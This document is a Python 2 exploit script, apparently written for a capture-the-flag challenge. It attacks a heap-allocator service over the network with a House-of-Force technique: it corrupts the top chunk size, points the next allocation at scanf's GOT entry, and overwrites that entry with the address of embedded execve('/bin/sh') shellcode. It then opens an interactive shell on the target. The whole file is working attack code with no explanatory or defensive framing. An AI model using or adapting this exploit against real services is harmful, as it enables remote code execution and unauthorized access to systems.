#!/usr/bin/python

import struct
import socket
import sys
import time
import binascii
import os
import math
import md5
import re
import hashlib
import telnetlib
import base64

alphanum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

def rnd_string(sz):
   res = ''
   for i in xrange(sz):
      res += alphanum[random.randrange(0, len(alphanum))]
   return res

def p(f, *args):
   return struct.pack(f, *args)

def u(f, v):
   return struct.unpack(f, v)

def hx(s):
   return binascii.hexlify(s)
   
def ux(s):
   return binascii.unhexlify(s)

def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact() 

if len(sys.argv) != 3:
   print "usage: python prog.py <ip> <port>"
   sys.exit(0)

tgthost = sys.argv[1]
tgtport = int(sys.argv[2])

target = (tgthost, tgtport)

s = socket.socket()
s.connect(target)


#DO THE FUN STUFF HERE

#0000000000601040 R_X86_64_JUMP_SLOT  __isoc99_scanf@GLIBC_2.7
scanf_got = 0x601040

#build payload
shellcode = \
   "\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48" + \
   "\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
# total size: 30 bytes

def add_block(s, sz, data):
   ru(s, "memory? ")
   s.send("%x\n" % sz)
   ptr = int(ru(s, "\n").strip().split()[-1], 16)
   ru(s, "data? ")
   s.send("%x\n" % len(data))
   s.send(data)
   return ptr

raw_input()

block_size = ((len(shellcode) + 32) & ~0xf) - 8
sc_addr = add_block(s, block_size, shellcode.ljust(block_size, 'A') + p("<Q", 0xffffffffffffffff & ~7))
top_chunk = sc_addr + block_size - 8
got_chunk = scanf_got - 16
big_size = (got_chunk - top_chunk) & 0xffffffffffffffff
add_block(s, big_size - 8, "AAAA")
add_block(s, 8, p("<Q", sc_addr))

# Once you have a shell on some socket s, maybe that's the
# same socket as above, maybe it's a new socket, then interact
# will use telnetlib to handle the asynchronous I/O needed to 
# interact with your shell

interact(s)
